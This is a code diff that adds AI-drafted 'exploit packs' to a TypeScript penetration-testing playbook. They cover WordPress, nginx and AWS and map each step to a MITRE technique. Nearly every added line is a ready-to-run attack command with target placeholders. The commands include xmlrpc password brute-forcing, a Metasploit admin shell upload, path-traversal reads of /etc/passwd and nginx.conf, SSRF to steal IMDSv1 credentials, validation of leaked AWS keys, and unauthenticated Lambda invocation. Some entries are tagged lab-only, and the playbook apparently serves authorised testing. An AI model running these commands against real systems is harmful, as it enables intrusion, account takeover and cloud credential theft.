@@ -1021,6 +1021,87 @@ export const PHASES: Phase[] = [
             mitreTechniques: ['T1190'],
             appliesTo: ['private', 'lab'],
           },
+          /* WordPress exploit pack — AI-drafted 2026-04-29.
+             Three vectors: vuln-plugin enum (recon-into-exploit
+             pivot), xmlrpc multicall brute-force (auth bypass
+             surface), and the canonical Metasploit
+             admin-shell-upload module. */
+          {
+            label: 'WPScan — enumerate vulnerable plugins',
+            command: 'wpscan --url {target} --enumerate vp --plugins-detection aggressive --api-token {wpscan_api_token} -o engagements/{target}/exploit/wpscan-vulns.txt',
+            techApplies: ['wordpress'],
+            mitreTechniques: ['T1190'],
+          },
+          {
+            label: 'WPScan — xmlrpc multicall brute-force',
+            command: 'wpscan --url {target} --passwords {wordlist} --usernames {user} --multicall-max-passwords 500 --throttle 3000',
+            techApplies: ['wordpress'],
+            appliesTo: ['private', 'lab'],
+            mitreTechniques: ['T1110.001'],
+          },
+          {
+            label: 'msfconsole — WordPress admin shell upload',
+            command: 'msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS {target}; set USERNAME {user}; set PASSWORD {password}; set LHOST {lhost}; set TARGETURI /; run; exit -y"',
+            techApplies: ['wordpress'],
+            appliesTo: ['private', 'lab'],
+            mitreTechniques: ['T1505.003'],
+          },
+          /* Nginx exploit pack — AI-drafted 2026-04-29. CVE-2013-4547
+             off-by-one (lab-only, narrow version range), the
+             classic alias-traversal misconfiguration probe (any
+             nginx with a missing trailing slash in `location
+             /static`-style aliases), and Gixy for offline config
+             auditing when you have a copy of nginx.conf. */
+          {
+            label: 'nginx — CVE-2013-4547 off-by-one probe',
+            command: 'curl -H "Host: {target}" -H "X-Forwarded-For: $(python3 -c \'print("127.0.0.1 " + "X"*8000)\')" http://{target}/ -v',
+            techApplies: ['nginx'],
+            mitreTechniques: ['T1190'],
+            appliesTo: ['lab'],
+          },
+          {
+            label: 'nginx — alias-traversal probe',
+            command: 'curl -s http://{target}/static../etc/passwd && curl -s http://{target}/assets../etc/nginx/nginx.conf',
+            techApplies: ['nginx'],
+            mitreTechniques: ['T1190'],
+          },
+          {
+            label: 'Gixy — offline nginx config audit',
+            command: 'docker run --rm -v {config_path}:/etc/nginx yandex/gixy /etc/nginx/nginx.conf | tee engagements/{target}/exploit/gixy-findings.txt',
+            techApplies: ['nginx'],
+            osApplies: ['linux'],
+          },
+          /* AWS exploit pack — AI-drafted 2026-04-29. Four
+             distinct attack surfaces: misconfigured public S3
+             bucket (data exfil), SSRF chained to IMDSv1
+             credential theft, leaked-key validation via STS,
+             and unauthenticated Lambda function URL invocation
+             (a misconfiguration class introduced when AuthType
+             defaults to NONE). */
+          {
+            label: 'AWS — list public S3 bucket contents',
+            command: 'aws s3 ls s3://{bucket} --no-sign-request --region {region} --recursive | tee engagements/{target}/exploit/s3-public-read-$(date +%Y%m%d-%H%M).txt',
+            techApplies: ['aws'],
+            mitreTechniques: ['T1530'],
+          },
+          {
+            label: 'AWS — SSRF → IMDSv1 credential theft',
+            command: 'curl -s "http://{target}/{ssrf_param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" && curl -s "http://{target}/{ssrf_param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}" | tee engagements/{target}/exploit/imdsv1-creds-$(date +%Y%m%d-%H%M).json',
+            techApplies: ['aws'],
+            mitreTechniques: ['T1552.005'],
+          },
+          {
+            label: 'AWS — validate leaked access key',
+            command: 'export AWS_ACCESS_KEY_ID="{access_key_id}" AWS_SECRET_ACCESS_KEY="{secret_access_key}" && aws sts get-caller-identity | tee engagements/{target}/exploit/aws-identity-$(date +%Y%m%d-%H%M).json',
+            techApplies: ['aws'],
+            mitreTechniques: ['T1078.004'],
+          },
+          {
+            label: 'AWS — invoke unauthenticated Lambda URL',
+            command: 'curl -s -X POST "https://{lambda_url}.lambda-url.{region}.on.aws/" -H "Content-Type: application/json" -d \'{"payload":"{command}"}\' | tee engagements/{target}/exploit/lambda-invoke-$(date +%Y%m%d-%H%M).json',
+            techApplies: ['aws'],
+            mitreTechniques: ['T1648'],
+          },
         ],
         branches: [
           { if: 'access landed', goto: 'post-ex' },
